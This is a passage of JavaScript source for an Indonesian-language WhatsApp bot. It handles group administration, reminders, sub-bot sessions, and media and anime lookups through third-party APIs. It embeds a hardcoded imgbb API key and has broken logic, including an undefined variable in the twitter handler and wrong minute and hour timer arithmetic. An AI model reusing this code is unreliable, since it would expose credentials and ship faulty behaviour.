❒ *「 User ${pushname} 」*
├ *Tag : @${sender.split('@')[0]}*
├ *Status : ${isPremium ? 'Premium':'Free'}*
├ *Status Bot : ${isOwner ? 'Owner':'User'}*
├ *Expired : ${prmm}*
├ *Limit : ${isPremium ? 'Unlimited' : `${getLimit(sender, limitCount, limit)}/${limitCount}`}*
├ *Limit Game : ${cekGLimit(sender, gcount, glimit)}/${gcount}*
└ *Balance User : $${getBalance(sender, balance)}*`
its = await getBuffer (ppimg)
arifi.sendMessage(from, its, image, {contextInfo: { forwardingScore: 9999, isForwarded: true, mentionedJid: [sender]},quoted: ftroli, caption: teks
})
break 
case 'status':
let s1 = banChats ? '> SELF-MODE' : '> PUBLIC-MODE'
let s2 = `${isOwner ? 'Owner' : isPremium ? 'Premium' : 'Vip'}`
stat = `*「 𝙎𝙏𝘼𝙏𝙐𝙎 𝘽𝙊𝙏 」*\n\n*Mode : ${s1}*\n*Status : ${s2}*`
reply(stat)
break
      case 'add':
        if (!isGroup) return reply(mess.only.group);
        if (!isGroupAdmins && !rojak.key.fromMe) return reply(mess.only.admin);
        if (!isBotGroupAdmins) return reply('Bot not admin');
        mentioned = rojak.message.extendedTextMessage.contextInfo.mentionedJid;
        if (mentioned.length > 1) {
          add(from, mentioned);
          reply(mess.success);
        } else if (mentioned.length < 1) {
          anu = rojak.message.extendedTextMessage.contextInfo.participant;
          arifi.groupAdd(from, [anu]);
          reply(mess.success);
        } else {
          add(from, mentioned);
          reply(mess.success);
        }
        break;
      case 'getbio': 
     if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        var yy = rojak.message.extendedTextMessage.contextInfo.participant;
        var p = await arifi.getStatus(`${yy}`, MessageType.text);
        reply(p.status);
        if (p.status == 401) {
          reply('Status Profile Not Found');
        }
        limitAdd(sender, limit)
        break; 
        
      // Get Name
      case 'getname': 
     if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        var ambl = rojak.message.extendedTextMessage.contextInfo.participant;
        let sname =
          arifi.contacts[ambl] != undefined
            ? arifi.contacts[ambl].sname || arifi.contacts[ambl].notify
            : undefined;
        reply(sname);
        limitAdd(sender, limit)
        break; 
        
      case 'setdesc':
        if (!rojak.key.fromMe && !isGroupAdmins) return reply('Admin Group Only');
        if (!isBotGroupAdmins) return reply('Bot not admin');
        if (!isGroup) return;
        arifi.groupUpdateDescription(from, `${args.join(' ')}`);
        arifi.sendMessage(from, 'Succes change description group', text, {
          quoted: rojak,
        });
        break;
      // Set Name Group
      case 'setname':
        if (!rojak.key.fromMe && !isGroupAdmins) return reply('Admin Group Only');
        if (!isBotGroupAdmins) return reply('Bot not admin');
        if (!isGroup) return;
        arifi.groupUpdateSubject(from, `${args.join(' ')}`);
        arifi.sendMessage(from, 'Succes change name group', text, {
          quoted: rojak,
        });
        break;
      // Group Info
      case 'groupinfo':
        if (!isGroup) return;
        ppUrl = await arifi.getProfilePicture(from); // leave empty to get your own
        buffergbl = await getBuffer(ppUrl);
        arifi.sendMessage(from, buffergbl, image, {
          quoted: rojak,
          caption: `\`\`\`「 Group Info 」\`\`\`\n*${unique[0]} > Name* : ${groupName}\n*${unique[0]} > Member* : ${groupMembers.length}\n*${unique[0]} > Admin* : ${groupAdmins.length}\n*${unique[0]} > Description* : \n${groupDesc}`,
        });
        break;
      // Demote Admins
      case 'demote':
        if (!rojak.key.fromMe && !isGroupAdmins) return reply('Admin Group Only');
        if (!isGroup) return;
        if (!isBotGroupAdmins) return reply('Bot not admin');
        if (
          rojak.message.extendedTextMessage === undefined ||
          rojak.message.extendedTextMessage === null
        )
          return reply('Reply members');
        mentionede = rojak.message.extendedTextMessage.contextInfo.participant;
        arifi.groupDemoteAdmin(from, [mentionede]);
        teks = `Members @${mentionede.split('@')[0]} succes demote`;
        arifi.sendMessage(from, teks, text, {
          quoted: rojak,
          contextInfo: { mentionedJid: [mentionede] },
        });
        break;
      // Promote Members
      case 'promote':
        if (!rojak.key.fromMe && !isGroupAdmins) return reply('Admin Group Only');
        if (!isGroup) return;
        if (!isBotGroupAdmins) return reply('Bot not admin');
        if (
          rojak.message.extendedTextMessage === undefined ||
          rojak.message.extendedTextMessage === null
        )
          return reply('Reply members');
        mentionede = rojak.message.extendedTextMessage.contextInfo.participant;
        arifi.groupMakeAdmin(from, [mentionede]);
        teks = `Members @${mentionede.split('@')[0]} succes promote`;
        arifi.sendMessage(from, teks, text, {
          quoted: rojak,
          contextInfo: { mentionedJid: [mentionede] },
        });
        break;
      case 'closegc': 
      //  if (!isPremium) return reply(mess.OnlyPrem)
        if (!rojak.key.fromMe && !isGroupAdmins) return reply('Only admin');
        if (!isBotGroupAdmins) return reply('Bot not admin');
        if (!isGroup) return;
        reply(`*SUCCES CLOSE GROUP*`);
        arifi.groupSettingChange(from, GroupSettingChange.messageSend, true);
        break;
      case 'revoke':
        if (!rojak.key.fromMe && !isGroupAdmins) return reply('Only admin');
        if (!isBotGroupAdmins) return reply('Bot not admin');
        if (!isGroup) return;
        arifi.revokeInvite(from);
        reply('```Succes revoke link group```');
        break;
      case 'opengc':
        if (!rojak.key.fromMe && !isGroupAdmins) return reply('Only admin');
        if (!isBotGroupAdmins) return reply('Bot not admin');
        if (!isGroup) return;
        reply(`*SUCCES OPEN GROUP*`);
        arifi.groupSettingChange(from, GroupSettingChange.messageSend, false);
        break; 
        
				 
      case 'reminder': // by Slavyan 
     if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        if (!q)
          return reply(
            `CONTOH PENGGUNANNYA:\n${prefix}reminder text/2s\n\nNOTE: \n*s* - seconds\n*m* - minutes\n*h* - hours\n*d* - days`
          );
        teks = body.slice(10);
        let messRemind = teks.split('/')[0];
        let timeRemind = teks.split('/')[1];
        typeRemind = 'Text';
        if (isQuotedImage) typeRemind = 'Image';
        if (isQuotedSticker) typeRemind = 'Sticker';
        if (isQuotedAudio) typeRemind = 'Audio';
        if (!isQuotedImage && !isQuotedAudio && !isQuotedSticker)
          typeRemind = 'Text';
        let parsedTime = ms(toMs(timeRemind));
        reminder.addReminder(
          sender,
          messRemind,
          typeRemind,
          timeRemind,
          _reminder
        );
        if (!isQuotedImage && !isQuotedSticker && !isQuotedAudio) {
          await arifi.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Text
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split('@')[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          let intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              arifi.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split('@')[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                './database/reminder.json',
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedSticker) {
          encmedia = JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm'))
            .message.extendedTextMessage.contextInfo;
          media = await arifi.downloadAndSaveMediaMessage(encmedia);
          await arifi.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Sticker
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split('@')[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          let intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              arifi.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split('@')[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              arifi.sendMessage(from, fs.readFileSync(media), sticker);
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                './database/reminder.json',
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedImage) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm')).message
                .extendedTextMessage.contextInfo
            : rojak;
          media = await arifi.downloadAndSaveMediaMessage(encmedia);
          await arifi.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Image
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split('@')[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          let intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              teks = `── 「 REMINDER 」 ──

⏰ @${sender.split('@')[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`;
              arifi.sendMessage(from, media, image, {
                contextInfo: { mentionedJid: [sender] },
                caption: teks,
              });
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                './database/reminder.json',
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedAudio) {
          encmedia = JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm'))
            .message.extendedTextMessage.contextInfo;
          media = await arifi.downloadAndSaveMediaMessage(encmedia);
          await arifi.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Audio
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split('@')[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          let intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              arifi.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split('@')[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              arifi.sendMessage(from, fs.readFileSync(media), audio, {
                contextInfo: { mentionedJid: [sender] },
                mimetype: 'audio/mp4',
                ptt: true,
                caption: teks,
              });
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                './database/reminder.json',
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        }
        limitAdd(sender, limit)
        break;
      case 'jadibot': 
      if (!isPremium) return reply(mess.only.prem)
        if (rojak.key.fromMe) return reply('Tidak bisa jadibot di dalam bot');
        jadibot(reply, arifi, from);
        break; 
         
      case 'stopjadibot':
        if (rojak.key.fromMe)
          return reply('tidak bisa stopjadibot kecuali owner');
        stopjadibot(reply);
        break;
      case 'listbot':
        let tekss = '「 *LIST JADIBOT* 」\n';
        for (let i of listjadibot) {
          tekss += `*Nomor* : ${i.jid.split('@')[0]}
*Nama* : ${i.name}
*Device* : ${i.phone.device_manufacturer}
*Model* : ${i.phone.device_model}\n\n`;
        }
        reply(tekss);
        break;

      //------------------< Fitur yg pake button >-------------------
      case 'setprefix':
        if (!isOwner && !rojak.key.fromMe) return reply(mess.only.owner)
        sendButMessage(
          from,
          `PREFIX : ${prefixStatus ? 'Multi Prefix' : 'No Prefix'}`,
          `Silahkan pilih salah satu`,
          [
            {
              buttonId: 'id12',
              buttonText: {
                displayText: `NOPREFIX`,
              },
              type: 1,
            },
            {
              buttonId: 'id13',
              buttonText: {
                displayText: `MULTIPREFIX`,
              },
              type: 1,
            },
          ]
        );
        break;
      case 'mode':
        if (!isOwner && !rojak.key.fromMe) return reply(mess.only.owner)
        sendButMessage(from, `MODE SELF/PUBLIC`, `Silahkan pilih salah satu`, [
          {
            buttonId: `${prefix}self`,
            buttonText: {
              displayText: `SELF MODE`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}public`,
            buttonText: {
              displayText: `PUBLIC MODE`,
            },
            type: 1,
          },
        ]);
        break; 
        case 'closetime':  
        if (!isBotGroupAdmins) return reply('Bot not admin');
        if (!isGroupAdmins && !rojak.key.fromMe) return reply('Khusus admin');
        if (!isGroup) return reply('Khusus di grup');		 
        reply('AKSES WAKTU DIPROSES')   	
                arifi.updatePresence(from, Presence.composing) 
                if (args[1]=='detik') {var timer = args[0]+'000'
				} else if (args[1]=='menit') {var timer = args[0]+'0000'
				} else if (args[1]=='jam') {var timer = args[0]+'0000'
				} else {return reply('*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik')}
				setTimeout( () => {
				var nomor = rojak.participant
				let close = {
				text: `*ᴛᴇᴘᴀᴛ ᴡᴀᴋᴛᴜ* ɢʀᴜᴘ ᴅɪᴛᴜᴛᴜᴘ ᴏʟᴇʜ ᴀᴅᴍɪɴ @${nomor.split('@s.whatsapp.net')[0]}\nꜱᴇᴋᴀʀᴀɴɢ *ʜᴀɴʏᴀ ᴀᴅᴍɪɴ* ʏᴀɴɢ ᴅᴀᴘᴀᴛ ᴍᴇɴɢɪʀɪᴍ ᴘᴇꜱᴀɴ`,
				contextInfo: { mentionedJid: [nomor] }
				}
				arifi.groupSettingChange (from, GroupSettingChange.messageSend, true);
				reply(close)
				}, timer)
				break 
		     	case 'opentime':  
		     	if (!isBotGroupAdmins) return reply('Bot not admin');
        if (!isGroupAdmins && !rojak.key.fromMe) return reply('Khusus admin');
        if (!isGroup) return reply('Khusus di grup');		    
                reply('AKSES WAKTU DIPROSES')   
                arifi.updatePresence(from, Presence.composing) 
                if (args[1]=='detik') {var timer = args[0]+'000'
				} else if (args[1]=='menit') {var timer = args[0]+'00000'
				} else if (args[1]=='jam') {var timer = args[0]+'00000'
				} else {return reply('*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik')}
				setTimeout( () => {
				var nomor = rojak.participant
				let open = {
				text: `*ᴛᴇᴘᴀᴛ ᴡᴀᴋᴛᴜ* ɢʀᴜᴘ ᴅɪʙᴜᴋᴀ ᴏʟᴇʜ ᴀᴅᴍɪɴ @${nomor.split('@s.whatsapp.net')[0]}\nꜱᴇᴋᴀʀᴀɴɢ *ᴍᴇᴍʙᴇʀ* ᴅᴀᴘᴀᴛ ᴍᴇɴɢɪʀɪᴍ ᴘᴇꜱᴀɴ`,
				contextInfo: { mentionedJid: [nomor] }
				}
				arifi.groupSettingChange (from, GroupSettingChange.messageSend, false);
				reply(open)
				}, timer)
				break  
      case 'grup':
        if (!rojak.key.fromMe) return;
        sendButMessage(from, `GROUP SETTING`, `Silahkan pilih salah satu`, [
          {
            buttonId: `${prefix}opengc`,
            buttonText: {
              displayText: `OPEN`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}closegc`,
            buttonText: {
              displayText: `CLOSE`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}revoke`,
            buttonText: {
              displayText: `REVOKE INVITE`,
            },
            type: 1,
          },
        ]);
        break;
      //end
      //------------------< Fitur downloader >-------------------
     case 'tiktok': 
      if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
   if (args.length == 0) return reply(`Example: ${prefix + command} LINK TIKTOK`)                  
        if (!isUrl(args[0]) && !args[0].includes('tiktok.com'))
          return reply(mess.Iv);
        var bv = await fetchJson(         
          `https://dhn-api.herokuapp.com/downloader/tiktok/nowatermark?url=${args[0]}&apikey=${dhkey}`
        );
        var b = bv.result.author_metadata;
        var tamnel = await getBuffer(
          bv.result.media_resources.image.contentUrl
        );
        var a = bv.result.media_metadata;
        sendButImage(
          from,
          `⚜️ *Nickname*: ${b.username}\n❤️ *Like*: ${a.stats.diggCount}\n💬 *Komentar*: ${a.stats.commentCount}\n🔁 *Share*: ${a.stats.shareCount}\n🎞️ *Views*: ${a.stats.playCount}`,
          `Silahkan pilih salah satu format yg mau didownload`,
          tamnel,
          [
            {
              buttonId: `${prefix}id78 ${args[0]}|video`,
              buttonText: {
                displayText: `VIDEO`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}id78 ${args[0]}|audio`,
              buttonText: {
                displayText: `AUDIO`,
              },
              type: 1,
            },
          ]
        );
        break;
        
              
      case 'youtube': 
     if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        if (!isUrl(args[0]) && !args[0].includes('youtu'))
          return reply(mess.Iv);
        var bv = await fetchJson(
          `https://api.dhnjing.xyz/downloader/youtube/video?url=${args[0]}&apikey=${dhkey}`
        );
        var b = bv.result.creator_metadata;
        var tamnel = await getBuffer(bv.result.media_resources.thumbnail);
        var a = bv.result.media_metadata;
        sendButImage(
          from,
          `*Name channel*: ${b.name}\n📜 *Title*: ${a.title}\n❤️ *Like*: ${a.totalLikes}\n👎 *Dislike*: ${a.totalDislikes}\n🎞️ *Views*: ${a.totalViews}`,
          `Silahkan pilih salah satu format yg mau didownload`,
          tamnel,
          [
            {
              buttonId: `${prefix}ytdl ${args[0]}|video`,
              buttonText: {
                displayText: `VIDEO`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}ytdl ${args[0]}|music`,
              buttonText: {
                displayText: `AUDIO`,
              },
              type: 1,
            },
          ]
        );
        limitAdd(sender, limit)
        break; 
        case 'wanted':
        if (
          ((isMedia && !rojak.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          ted = isQuotedImage
            ? JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm')).message
                .extendedTextMessage.contextInfo
            : rojak;
          reply('Loading.....');
          owgi = await arifi.downloadAndSaveMediaMessage(ted);
          //	  console.log(owgi)
          anu = await imgbb('3395a377ebac7e9f744c3683b44a2a59', owgi);
          console.log(anu);
          hehe = await getBuffer(
            `https://fdz-app.herokuapp.com/api/maker/wanted?picurl=${anu.display_url}`
          );
          arifi.sendMessage(from, hehe, image, {
            quoted: rojak,
            thumbnail: Buffer.alloc(0),
          });
        }
        break;
      //JCCHCCGHTHDTRSRS 
      case 'twitter': 
     if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        if (!isUrl(args[0]) && !args[0].includes('twitter.com'))
          return reply(mess.Iv);
        if (!q) return fakegroup('Linknya?');
        ten = args[0];
        var res = await hx.twitter(`${ten}`);
        ren = `${g.HD}`;
        sendMediaURL(from, ren, 'DONE');
        limitAdd(sender, limit)
        break;
      case 'facebook': 
     if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
        if (!q) return reply('Linknya?');
        if (!isUrl(args[0]) && !args[0].includes('facebook.com'))
          return reply(mess.Iv);
        reply(mess.wait);
        te = args.join(' ');
        hx.fbdown(`${te}`).then((G) => {
          ten = `${G.HD}`;
          sendMediaURL(from, ten, `*Link video_normal* : ${G.Normal_video}`);
        });
        limitAdd(sender, limit)
        break; 
          
                    
      case 'instagram': 
     if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
   if (args.length == 0) return reply(`Example: ${prefix + command} link instagram`)                  
        if (!isUrl(args[0]) && !args[0].includes('instagram.com'))
          return reply(mess.Iv);
        if (!q) return fakegroup('Linknya?');
        reply(mess.wait);
        hx.igdl(args[0]).then(async (result) => {
          for (let i of result.medias) {
            if (i.url.includes('mp4')) {
              let link = await getBuffer(i.url);
              arifi.sendMessage(from, link, video, {
                quoted: rojak,
                caption: `Type : ${i.type}`,
              });
            } else {
              let link = await getBuffer(i.url);
              arifi.sendMessage(from, link, image, {
                quoted: rojak,
                caption: `Type : ${i.type}`,
              });
            }
          }
        });
        limitAdd(sender, limit)
        break;  
        case 'kusonime': 
          if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://kusonime.com/nanatsu-no-taizai-bd-batch-subtitle-indonesia/`)
                    ini_url = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/kusonime?apikey=${lolkey}&url=${ini_url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Japanese : ${get_result.japanese}\n`
                    ini_txt += `Genre : ${get_result.genre}\n`
                    ini_txt += `Seasons : ${get_result.seasons}\n`
                    ini_txt += `Producers : ${get_result.producers}\n`
                    ini_txt += `Type : ${get_result.type}\n`
                    ini_txt += `Status : ${get_result.status}\n`
                    ini_txt += `Total Episode : ${get_result.total_episode}\n`
                    ini_txt += `Score : ${get_result.score}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Released On : ${get_result.released_on}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    link_dl = get_result.link_dl
                    for (var x in link_dl) {
                        ini_txt += `\n${x}\n`
                        for (var y in link_dl[x]) {
                            ini_txt += `${y} - ${link_dl[x][y]}\n`
                        }
                    }
                    ini_buffer = await getBuffer(get_result.thumbnail)
                    await arifi.sendMessage(from, ini_buffer, image, { quoted: rojak, caption: ini_txt })
                    limitAdd(sender, limit)
                    break
                case 'kusonimesearch': 
                  if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join(' ')
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/kusonimesearch?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Japanese : ${get_result.japanese}\n`
                    ini_txt += `Genre : ${get_result.genre}\n`
                    ini_txt += `Seasons : ${get_result.seasons}\n`
                    ini_txt += `Producers : ${get_result.producers}\n`
                    ini_txt += `Type : ${get_result.type}\n`
                    ini_txt += `Status : ${get_result.status}\n`
                    ini_txt += `Total Episode : ${get_result.total_episode}\n`
                    ini_txt += `Score : ${get_result.score}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Released On : ${get_result.released_on}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    link_dl = get_result.link_dl
                    for (var x in link_dl) {
                        ini_txt += `\n${x}\n`
                        for (var y in link_dl[x]) {
                            ini_txt += `${y} - ${link_dl[x][y]}\n`
                        }
                    }
                    ini_buffer = await getBuffer(get_result.thumbnail)
                    await arifi.sendMessage(from, ini_buffer, image, { quoted: rojak, caption: ini_txt })
                    limitAdd(sender, limit)
                    break
                case 'otakudesu':
                  if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://otakudesu.tv/lengkap/pslcns-sub-indo/`)
                    ini_url = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/otakudesu?apikey=${lolkey}&url=${ini_url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Japanese : ${get_result.japanese}\n`
                    ini_txt += `Judul : ${get_result.judul}\n`
                    ini_txt += `Type : ${get_result.type}\n`
                    ini_txt += `Episode : ${get_result.episodes}\n`
                    ini_txt += `Aired : ${get_result.aired}\n`
                    ini_txt += `Producers : ${get_result.producers}\n`
                    ini_txt += `Genre : ${get_result.genres}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Studios : ${get_result.status}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Credit : ${get_result.credit}\n`
                    get_link = get_result.link_dl
                    for (var x in get_link) {
                        ini_txt += `\n\n*${get_link[x].title}*\n`
                        for (var y in get_link[x].link_dl) {
                            ini_info = get_link[x].link_dl[y]
                            ini_txt += `\n\`\`\`Reso : \`\`\`${ini_info.reso}\n`
                            ini_txt += `\`\`\`Size : \`\`\`${ini_info.size}\n`
                            ini_txt += `\`\`\`Link : \`\`\`\n`
                            down_link = ini_info.link_dl
                            for (var z in down_link) {
                                ini_txt += `${z} - ${down_link[z]}\n`
                            }
                        }
                    }
                    limitAdd(sender, limit)
                    reply(ini_txt)
                    break
                case 'otakudesusearch': 
                  if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join(' ')
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/otakudesusearch?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Japanese : ${get_result.japanese}\n`
                    ini_txt += `Judul : ${get_result.judul}\n`
                    ini_txt += `Type : ${get_result.type}\n`
                    ini_txt += `Episode : ${get_result.episodes}\n`
                    ini_txt += `Aired : ${get_result.aired}\n`
                    ini_txt += `Producers : ${get_result.producers}\n`
                    ini_txt += `Genre : ${get_result.genres}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Studios : ${get_result.status}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Credit : ${get_result.credit}\n`
                    get_link = get_result.link_dl
                    for (var x in get_link) {
                        ini_txt += `\n\n*${get_link[x].title}*\n`
                        for (var y in get_link[x].link_dl) {
                            ini_info = get_link[x].link_dl[y]
                            ini_txt += `\n\`\`\`Reso : \`\`\`${ini_info.reso}\n`
                            ini_txt += `\`\`\`Size : \`\`\`${ini_info.size}\n`
                            ini_txt += `\`\`\`Link : \`\`\`\n`
                            down_link = ini_info.link_dl
                            for (var z in down_link) {
                                ini_txt += `${z} - ${down_link[z]}\n`
                            }
                        }
                    }
                    reply(ini_txt)
                    limitAdd(sender, limit)
                    break 
                    case 'character': 
                      if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                    if (args.length == 0) return reply(`Example: ${prefix + command} Miku Nakano`)
                    query = args.join(' ')
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/character?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Id : ${get_result.id}\n`
                    ini_txt += `Name : ${get_result.name.full}\n`
                    ini_txt += `Native : ${get_result.name.native}\n`
                    ini_txt += `Favorites : ${get_result.favourites}\n`
                    ini_txt += `Media : \n`
                    ini_media = get_result.media.nodes
                    for (var x of ini_media) {
                        ini_txt += `- ${x.title.romaji} (${x.title.native})\n`
                    }
                    ini_txt += `\nDescription : \n${get_result.description.replace(/__/g, '_')}`
                    thumbnail = await getBuffer(get_result.image.large)
                    await arifi.sendMessage(from, thumbnail, image, { quoted: rojak, caption: ini_txt })
                    limitAdd(sender, limit)
                    break
                case 'manga': 
                  if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join(' ')
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/manga?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Id : ${get_result.id}\n`
                    ini_txt += `Id MAL : ${get_result.idMal}\n`
                    ini_txt += `Title : ${get_result.title.romaji}\n`
                    ini_txt += `English : ${get_result.title.english}\n`
                    ini_txt += `Native : ${get_result.title.native}\n`
                    ini_txt += `Format : ${get_result.format}\n`
                    ini_txt += `Chapters : ${get_result.chapters}\n`
                    ini_txt += `Volume : ${get_result.volumes}\n`
                    ini_txt += `Status : ${get_result.status}\n`
                    ini_txt += `Source : ${get_result.source}\n`
                    ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
                    ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
                    ini_txt += `Genre : ${get_result.genres.join(', ')}\n`
                    ini_txt += `Synonyms : ${get_result.synonyms.join(', ')}\n`
                    ini_txt += `Score : ${get_result.averageScore}%\n`
                    ini_txt += `Characters : \n`
                    ini_character = get_result.characters.nodes
                    for (var x of ini_character) {
                        ini_txt += `- ${x.name.full} (${x.name.native})\n`
                    }
                    ini_txt += `\nDescription : ${get_result.description}`
                    thumbnail = await getBuffer(get_result.coverImage.large)
                    await arifi.sendMessage(from, thumbnail, image, { quoted: rojak, caption: ini_txt })
                    limitAdd(sender, limit)
                    break
                case 'anime': 
                  if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join(' ')
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/anime?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Id : ${get_result.id}\n`
                    ini_txt += `Id MAL : ${get_result.idMal}\n`
                    ini_txt += `Title : ${get_result.title.romaji}\n`
